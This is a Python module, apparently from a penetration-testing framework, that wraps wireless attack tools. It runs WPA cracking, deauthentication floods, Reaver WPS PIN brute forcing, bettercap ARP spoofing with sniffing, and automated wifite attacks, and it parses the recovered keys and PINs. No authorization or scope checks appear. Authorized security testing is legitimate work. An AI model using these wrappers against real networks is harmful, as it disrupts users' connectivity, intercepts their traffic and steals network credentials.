"""Wireless security tool wrappers — WiFi and Bluetooth testing.

Integrates:
- aircrack-ng suite (airodump-ng, aireplay-ng, aircrack-ng)
- reaver (WPS attacks)
- bettercap (network attacks)
- wifite (automated WiFi attacks)
- kismet (wireless monitoring)
"""

from __future__ import annotations

import asyncio
import re
import shutil
from dataclasses import dataclass
from typing import Any

import structlog

from recursec.tools.tool_runner import ToolResult

logger = structlog.get_logger()


async def _run(cmd: list[str], timeout: float = 120.0) -> ToolResult:
    tool_name = cmd[0] if cmd else "unknown"
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        stdout_bytes, stderr_bytes = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        stdout = stdout_bytes.decode(errors="replace") if stdout_bytes else ""
        stderr = stderr_bytes.decode(errors="replace") if stderr_bytes else ""
        return ToolResult(
            tool_name=tool_name, command=" ".join(cmd),
            stdout=stdout, stderr=stderr,
            return_code=proc.returncode or 0,
            parsed_data={},
        )
    except asyncio.TimeoutError:
        return ToolResult(tool_name=tool_name, command=" ".join(cmd),
                          stdout="", stderr="Timed out", return_code=1, parsed_data={})
    except FileNotFoundError:
        return ToolResult(tool_name=tool_name, command=" ".join(cmd),
                          stdout="", stderr=f"{tool_name} not found", return_code=127, parsed_data={})


@dataclass
class WirelessNetwork:
    """Discovered wireless network."""
    bssid: str = ""
    essid: str = ""
    channel: int = 0
    encryption: str = ""  # WPA2, WPA3, WEP, OPN
    cipher: str = ""
    auth: str = ""
    power: int = 0
    clients: int = 0
    wps: bool = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "bssid": self.bssid, "essid": self.essid, "channel": self.channel,
            "encryption": self.encryption, "cipher": self.cipher, "auth": self.auth,
            "power": self.power, "clients": self.clients, "wps": self.wps,
        }


class AircrackWrapper:
    """Wrapper for aircrack-ng suite tools."""

    def __init__(self) -> None:
        self.available = shutil.which("aircrack-ng") is not None

    async def scan_networks(self, interface: str, duration: int = 30) -> list[WirelessNetwork]:
        """Scan for wireless networks using airodump-ng."""
        if not shutil.which("airodump-ng"):
            return []

        csv_path = f"/tmp/recursec_airodump_{interface}"
        cmd = [
            "airodump-ng", interface,
            "--output-format", "csv",
            "-w", csv_path,
        ]

        # Run for specified duration then kill
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
            )
            await asyncio.sleep(duration)
            proc.terminate()
            await proc.wait()
        except Exception:
            return []

        # Parse CSV output
        return self._parse_airodump_csv(f"{csv_path}-01.csv")

    def _parse_airodump_csv(self, csv_path: str) -> list[WirelessNetwork]:
        """Parse airodump-ng CSV output."""
        networks: list[WirelessNetwork] = []
        try:
            with open(csv_path) as f:
                content = f.read()
        except FileNotFoundError:
            return networks

        in_ap_section = False
        for line in content.splitlines():
            if line.startswith("BSSID"):
                in_ap_section = True
                continue
            if line.startswith("Station MAC"):
                break
            if not in_ap_section or not line.strip():
                continue

            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14:
                net = WirelessNetwork(
                    bssid=parts[0],
                    channel=int(parts[3]) if parts[3].strip().isdigit() else 0,
                    power=int(parts[8]) if parts[8].strip().lstrip("-").isdigit() else 0,
                    encryption=parts[5],
                    cipher=parts[6],
                    auth=parts[7],
                    essid=parts[13],
                )
                networks.append(net)

        return networks

    async def crack_wpa(self, capture_file: str, wordlist: str) -> ToolResult:
        """Attempt WPA/WPA2 cracking with aircrack-ng."""
        cmd = ["aircrack-ng", "-w", wordlist, capture_file]
        result = await _run(cmd, timeout=3600.0)

        # Parse result
        if "KEY FOUND!" in result.stdout:
            key_match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
            if key_match:
                result.parsed_data = {"cracked": True, "key": key_match.group(1)}
        else:
            result.parsed_data = {"cracked": False}

        return result

    async def deauth(self, interface: str, bssid: str, count: int = 5) -> ToolResult:
        """Send deauthentication frames."""
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
        return await _run(cmd, timeout=30.0)


class ReaverWrapper:
    """Wrapper for Reaver WPS attacks."""

    def __init__(self) -> None:
        self.available = shutil.which("reaver") is not None

    async def attack_wps(
        self, interface: str, bssid: str, channel: int = 0, timeout: float = 3600.0
    ) -> ToolResult:
        """Run Reaver WPS brute-force attack."""
        cmd = ["reaver", "-i", interface, "-b", bssid, "-vv"]
        if channel > 0:
            cmd.extend(["-c", str(channel)])

        result = await _run(cmd, timeout=timeout)

        # Parse result
        pin_match = re.search(r"WPS PIN:\s*'?(\d+)'?", result.stdout)
        psk_match = re.search(r"WPA PSK:\s*'?(.*?)'?\s*$", result.stdout, re.MULTILINE)

        result.parsed_data = {
            "pin": pin_match.group(1) if pin_match else "",
            "psk": psk_match.group(1) if psk_match else "",
            "success": bool(pin_match),
        }

        return result


class BettercapWrapper:
    """Wrapper for Bettercap network attacks."""

    def __init__(self) -> None:
        self.available = shutil.which("bettercap") is not None

    async def wifi_scan(self, interface: str, duration: int = 30) -> ToolResult:
        """Scan WiFi networks using bettercap."""
        caplet = f"""set wifi.interface {interface}
wifi.recon on
sleep {duration}
wifi.show
quit"""

        cmd = ["bettercap", "-eval", caplet, "-no-colors"]
        return await _run(cmd, timeout=float(duration + 30))

    async def arp_spoof(self, interface: str, target: str, gateway: str) -> ToolResult:
        """Run ARP spoofing attack."""
        caplet = f"""set arp.spoof.targets {target}
set arp.spoof.internal true
set net.sniff.local true
arp.spoof on
net.sniff on"""

        cmd = ["bettercap", "-iface", interface, "-eval", caplet, "-no-colors"]
        return await _run(cmd, timeout=60.0)


class WifiteWrapper:
    """Wrapper for wifite automated WiFi attacks."""

    def __init__(self) -> None:
        self.available = shutil.which("wifite") is not None

    async def automated_attack(
        self, interface: str = "", targets: list[str] | None = None, timeout: float = 3600.0
    ) -> ToolResult:
        """Run automated WiFi attack with wifite."""
        cmd = ["wifite", "--kill"]
        if interface:
            cmd.extend(["-i", interface])
        if targets:
            for bssid in targets:
                cmd.extend(["-b", bssid])

        return await _run(cmd, timeout=timeout)


class KismetWrapper:
    """Wrapper for Kismet wireless monitoring."""

    def __init__(self) -> None:
        self.available = shutil.which("kismet") is not None

    async def scan(self, interface: str, duration: int = 60) -> ToolResult:
        """Run Kismet wireless scan."""
        cmd = [
            "kismet", "-c", interface,
            "--override", "log_prefix=/tmp/recursec_kismet",
            "-t", str(duration),
        ]
        return await _run(cmd, timeout=float(duration + 30))
